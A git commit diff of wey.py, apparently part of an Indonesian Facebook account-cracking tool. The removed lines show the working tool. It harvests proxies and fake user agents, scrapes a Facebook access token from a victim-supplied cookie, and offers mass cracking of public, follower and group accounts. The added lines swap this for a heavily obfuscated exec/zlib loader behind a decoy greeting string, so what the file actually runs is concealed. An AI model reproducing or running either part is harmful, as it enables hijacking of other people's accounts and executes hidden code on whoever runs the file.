044df9865645f4143ddfb57775ea6a11388c2094
away33sah <115048990+away33sah@users.noreply.github.com>
2022-12-20 07:50:32 +0700

    Update wey.py

--- wey.py
+++ wey.py
@@ -1,221 +1,17 @@
-#-----------------[ IMPORT-MODULE ]-------------------
-import requests,bs4,json,os,sys,random,datetime,time,re
-import urllib3,rich,base64
-from rich.table import Table as me
-from rich.console import Console as sol
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-from rich.console import Group as gp
-from rich.panel import Panel as nel
-from rich import print as cetak
-from rich.markdown import Markdown as mark
-from rich.columns import Columns as col
-from rich import print as rprint
-from rich import pretty
-from rich.text import Text as tekz
-pretty.install()
-CON=sol()
-#------------------[ USER-AGENT ]-------------------#
-ugen2=[]
-ugen=[]
-cokbrut=[]
-ses=requests.Session()
-princp=[]
-try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-	open('.prox.txt','w').write(prox)
-except Exception as e:
-	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
-prox=open('.prox.txt','r').read().splitlines()
-for xd in range(10000):
-	a='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	b=random.randrange(1, 9)
-	c=random.randrange(1, 9)
-	d='Nexus'
-	e=random.randrange(100, 9999)
-	f='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	g=random.randrange(1, 9)
-	h=random.randrange(1, 4)
-	i=random.randrange(1, 4)
-	j=random.randrange(1, 4)
-	k='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
-	ugen2.append(uaku)
+#!/usr/bin/python3
+from builtins import *
+from math import prod as Builtins
 
 
-	aa='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	b=random.choice(['6','7','8','9','10','11','12'])
-	c=' en-us; GT-'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	ugen.append(uaku2)
-for x in range(10):
-	a='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	b=random.randrange(100, 9999)
-	c=random.randrange(100, 9999)
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	h=random.randrange(1, 9)
-	i='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	j=random.randrange(1, 9)
-	k=random.randrange(1, 9)
-	l='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/22.11.0 Yowser/2.5 Safari/537.36'
-	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
-def uaku():
-	try:
-		ua=open('bbnew.txt','r').read().splitlines()
-		for ub in ua:
-			ugen.append(ub)
-	except:
-		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
-		ua=open('.bbnew.txt','w')
-		aa=re.findall('line">(.*?)<',str(a))
-		for un in aa:
-			ua.write(un+'\n')
-		ua=open('.bbnew.txt','r').read().splitlines()
-#------------[ INDICATION ]---------------#
-id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
-cokbrut=[]
-pwpluss,pwnya=[],[]
-#------------[ WARNA-COLOR ]--------------#
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m' 
-O = '\x1b[1;96m'
-N = '\x1b[0m'    
-Z = "\033[1;30m"
-sir = '\033[41m\x1b[1;97m'
-x = '\33[m' # DEFAULT
-m = '\x1b[1;91m' #RED +
-k = '\033[93m' # KUNING +
-h = '\x1b[1;92m' # HIJAU +
-hh = '\033[32m' # HIJAU -
-u = '\033[95m' # UNGU
-kk = '\033[33m' # KUNING -
-b = '\33[1;96m' # BIRU -
-p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
-#--------------------[ CONVERTER-BULAN ]--------------#
-dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
-dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
-tgl = datetime.datetime.now().day
-bln = dic[(str(datetime.datetime.now().month))]
-thn = datetime.datetime.now().year
-okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-#------------------[ MACHINE-SUPPORT ]---------------#
-def alvino_xy(u):
-        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
-def clear():
-	os.system('clear')
-def back():
-	login()
-#------------------[ LOGO-LAKNAT ]-----------------#
-def banner():
-	clear()
-	alvino_xy(f'''\t{asu} ______                                              
-\t|_   _ \                                             
-\t  | |_) | _ .--.  ,--.   ____   ____  .---.  _ .--.  
-\t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\] 
-\t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
-\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
-			{m}•{k}•{h}•{sir} JADDA$_JO$ {x}{m}•{k}•{h}•{x}''')
-#--------------------[ BAGIAN-MASUK ]--------------#
-def login():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-		tokenku.append(token)
-		try:
-			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-			sy2 = json.loads(sy.text)['name']
-			sy3 = json.loads(sy.text)['id']
-			menu(sy2,sy3)
-		except KeyError:
-			login_lagi334()
-		except requests.exceptions.ConnectionError:
-			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
-			lo = mark(li, style='red')
-			sol().print(lo, style='cyan')
-			exit()
-	except IOError:
-		login_lagi334()
-def login_lagi334():
-	try:
-		os.system('clear')
-		banner()
-		cetak(nel('\t©©© Saran Ektensi : [green]Cookiedough[white] ©©©'))
-		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
-		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 5.1; Elephone P4000 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/62.0.3202.66 Mobile Safari/537.36","referer": "https://x.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
-		find_token = re.search("(EAAG\w+)", data.text)
-		ken=open(".token.txt", "w").write(find_token.group(1))
-		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
-		exit()
-	except Exception as e:
-		os.system("rm -f .token.txt")
-		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
-		exit()
-#------------------[ BAGIAN-MENU ]----------------#
-def menu(my_name,my_id):
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		print('[×] Cookies Kadaluarsa ')
-		time.sleep(5)
-		login_lagi334()
-	os.system('clear')
-	banner()
-	ip = requests.get("https://api.ipify.org").text
-	cetak(nel('\tSelamat Datang [green]%s[white] Ngentod'%(my_name)))
-	alvino_xy(f'>> Your Idz : '+str(my_id))
-	alvino_xy(f'>> Your Ip  : {ip}')
-	print('')
-	print('>> 1. Crack Publik ')
-	print('>> 2. Crack Follower ')
-	print('>> 3. Crack Grup   ')
-	print('>> 4. Crack File	')
-	print('>> 5. Hasil Crack  ')
-	print('>> 0. Keluar       ')
-	_____alvino__adijaya_____ = input('\n>> Pilih : ')
-	if _____alvino__adijaya_____ in ['1']:
-		dump_massal()
-	elif _____alvino__adijaya_____ in ['2']:
-		dump_follower()
-	elif _____alvino__adijaya_____ in ['3']:
-		error()
-	elif _____alvino__adijaya_____ in ['4']:
-		crack_file()
-	elif _____alvino__adijaya_____ in ['5']:
-		result()
-	elif _____alvino__adijaya_____ in ['0']:
-		os.system('rm -rf .token.txt')
-		os.system('rm -rf .cookie.txt')
-		print('>> Sukses Logout+Hapus Kukis ')
-		exit()
-	else:
-		print('>> Pilih Yang Bener Asu ')
-		back()
-def error():
-	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
-	time.sleep(4)
-	back()_callfunction, _substract, _product, _while, Round, _add, Substract = exec, str, tuple, map, ord, globals, type
+__obfuscator__ = 'NOBFUS'
+__authors__ = ('nasirxo')
+__github__ = 'https://github.com/nasirxo/flb2'
+__license__ = 'EPL-2.0'
+
+__code__ = 'print("Hey How is That ?")'
+
+
+_callfunction, _substract, _product, _while, Round, _add, Substract = exec, str, tuple, map, ord, globals, type
 
 class Frame:
     def __init__(self, MemoryAccess):
@@ -538,3 +334,10 @@ if __name__ == '__main__':
 
         Frame(MemoryAccess = 54756 / -55988).CallFunction(Ceil = StackOverflow._walk / -29019)                                                                                                                                                                                                                                                          ;IIIIllIlIlIlllIlII,NMNMMMNNNNNNMMMMMMNMMNMM,DoOoDDOOoOOooooOoDDODOoD,MMNNNNMNNNNMMMMMNMNNNM,SSS222SS2222S2222222S2=(lambda xwwwxxwxxwwxwwxxxwxxxwwx:xwwwxxwxxwwxwwxxxwxxxwwx['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda xwwwxxwxxwwxwwxxxwxxxwwx:xwwwxxwxxwwxwwxxxwxxxwwx(__import__('\x7a\x6c\x69\x62'))),(lambda xwwwxxwxxwwxwwxxxwxxxwwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xwwwxxwxxwwxwwxxxwxxxwwx)"),filename='\x4f\x4f\x6f\x44\x6f\x44\x44\x44\x4f\x44\x44\x6f\x4f\x6f\x44\x6f\x44\x44\x6f\x6f',mode='\x65\x76\x61\x6c'))),(lambda IlIlllIIIIlIIlllIllIlIl,xwwwxxwxxwwxwwxxxwxxxwwx:IlIlllIIIIlIIlllIllIlIl(xwwwxxwxxwwxwwxxxwxxxwwx)),(lambda:(lambda xwwwxxwxxwwxwwxxxwxxxwwx:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(xwwwxxwxxwwxwwxxxwxxxwwx)"),filename='\x4f\x4f\x6f\x44\x6f\x44\x44\x44\x4f\x44\x44\x6f\x4f\x6f\x44\x6f\x44\x44\x6f\x6f',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
         StackOverflow.CallFunction(Ceil = StackOverflow._walk / -39823)                                                                                                                                                                                                                                                          ;SSS222SS2222S2222222S2()(MMNNNNMNNNNMMMMMNMNNNM(IIIIllIlIlIlllIlII(NMNMMMNNNNNNMMMMMMNMMNMM(DoOoDDOOoOOooooOoDDODOoD('\x76\x61\x72\x73'))),Frame._modulo(Add='XWXXXXWXXWWXWXXWXWW')+Frame._modulo(Add='NMMNMMNNMNNNNMNNN')+Frame._modulo(Add='OO0o0000ooOOoO00o0OOO')+Frame._modulo(Add='wxwwwwxwxxxwwxxxxxx')+Frame._modulo(Add='iijlllijljljjlijillljj')+Frame._modulo(Add='oOOOoDDOOOoDDDoOo')+Frame._modulo(Add='S22S2SS2SS2S2SSSS22SS2S2S2')+Frame._modulo(Add='LJIIILJLLJILJIILIII')+Frame._modulo(Add='WWWXXWXXXXXWWWXXXXXXWWWXX')+Frame._modulo(Add='nnmnmmmmnmnmnnmmmmmnmnmm')+Frame._modulo(Add='llIIIllllIllIIIIIlIlllIIl')+Frame._modulo(Add='MMNMMNMMMMNNMNNMMNMMMN')+Frame._modulo(Add='ODOoDOoODoOOOODOoOD')+Frame._modulo(Add='oOOoDOooooODODooDDO')+Frame._modulo(Add='SS22SS2S22SS22SSSS')+Frame._modulo(Add='nmmmnnnmnmnmmnmnmnnmmmnn')+Frame._modulo(Add='WWXXXWXXWXXWWXXXXXW')+Frame._modulo(Add='XXXWWXXWXWWWXWWWW')+Frame._modulo(Add='S22SS2S2222S222SS2SSS22SSS')+Frame._modulo(Add='nnmmmmmnnnmmnmnnnnnm')+Frame._modulo(Add='wwxwxxwxxwwwxwxwwxxxx')+Frame._modulo(Add='JLIIILLJJILLJLJIJIIJJJ')+Frame._modulo(Add='ijjiiijliijljjijijjiijili')+Frame._modulo(Add='nnmmnnnmmnmnmnmmmmn')+Frame._modulo(Add='S222SS22SS222222S22S2S2')+Frame._modulo(Add='SSS2S2SS22S22S222S2SS2')+Frame._modulo(Add='SSS2S22SSS22S22S2222')+Frame._modulo(Add='wxxwwwwwxwwwwwwxxwwxwxxxx')+Frame._modulo(Add='DooODODDoDDDOODOooDooD')+Frame._modulo(Add='XXXWXWXWXWWWWWXWWW')+Frame._modulo(Add='S22S22S22SSSS22S22S2222S')+Frame._modulo(Add='IlIlllIlIIIIIIIIlllIIIII')+Frame._modulo(Add='ILLLJILIJJJIIILILJJIL')+Frame._modulo(Add='WWXWXXXWXXWXWXWWXWXWXXWWW')+Frame._modulo(Add='WXXWWWXXWWWXXWWXXWWWW')+Frame._modulo(Add='wwxxwwxwxwwwxwwxw')+Frame._modulo(Add='xxxxwxwwwwwxwxwwwwxxwxw')+Frame._modulo(Add='XXWXWXXWWXXWXWXXWWXWWWW')+Frame._modulo(Add='IIIllIllIlIIIIIII')+Frame._modulo(Add='MNMMMMMMNNMMMMNMMMNNNMNNM')+Frame._modulo(Add='IIILILIJLJLJLLJLIJ')+Frame._modulo(Add='jjjjiljillijljljjjjl')+Frame._modulo(Add='xxwxxwxxxxxxxwwxwxx')+Frame._modulo(Add='xwwwwxwwwxxxxwwxwxwxxxw')+Frame._modulo(Add='ooODDODoOoODOOoOo')+Frame._modulo(Add='IIJJJIJJLLJJJJIJL')+Frame._modulo(Add='IlllllllIllIIIllIl')+Frame._modulo(Add='WWXWWXXXWXWXWXXWXXWXXWXX')+Frame._modulo(Add='xwxwxwwxwxxxwwxwwwwwxxw')+Frame._modulo(Add='IllllllIlIlIIIIIIllIIIll')+Frame._modulo(Add='wwxxxwxwwwwwxxwww')+Frame._modulo(Add='iliiijijjiijiljillljljjll')+Frame._modulo(Add='wxwwwwxxwwwxxxwxxwxww')+Frame._modulo(Add='xwwxxxwwxxxwxxwxwwwwwxxxw')+Frame._modulo(Add='ljjjjiiljjjjjjjljilljilij')+Frame._modulo(Add='oDOoOOOoDoOoODoDo')+Frame._modulo(Add='ODODDOOoDoDOoODDDOoOoDDOO')+Frame._modulo(Add='xwxwwwwwwxwwxxwwwx')+Frame._modulo(Add='xwwwxwwwwxwxwxxxwwx')+Frame._modulo(Add='ijiijljljillijiljji')+Frame._modulo(Add='lIIlIllIlIllIIllIl')+Frame._modulo(Add='OoODOODoOOoOoDooOOD')+Frame._modulo(Add='NNMNNNMMNNNMNNNNMMNN')+Frame._modulo(Add='xxwxxxxwxwwxwxxxx')+Frame._modulo(Add='IIlIIIIlIlIIlllllIlIlIII')+Frame._modulo(Add='WWWXWXWWXXWXWXWWWXXXXXW')+Frame._modulo(Add='NNMNNMNMNNMNMNMMMNNNMNMNN')+Frame._modulo(Add='NNMNMNMNMMMMNNNNNMMNNM')+Frame._modulo(Add='WWWXWWXWWWWXWXXWWWXXWXXW')+Frame._modulo(Add='ooooooOoooooDDoOoOO')+Frame._modulo(Add='O0OO0oooo0O00o0OooO0O0OOO')+Frame._modulo(Add='iljjjjiljliljjiiljliil')+Frame._modulo(Add='nnnnnnnnnnmmmnmnmmm')+Frame._modulo(Add='jiljlljillljjillj')+Frame._modulo(Add='nnmmnnmmmnnmnnmnmnmnnmmnn')))
+
+    except Exception as Theory:
+        if 106771 > 9134013:
+            Frame.execute(code = _substract(Theory))
+
+        elif 168163 > 1080877:
+            Frame(MemoryAccess = -52124 / -18106)._negative(Absolute = -12810 - StackOverflow._walk)
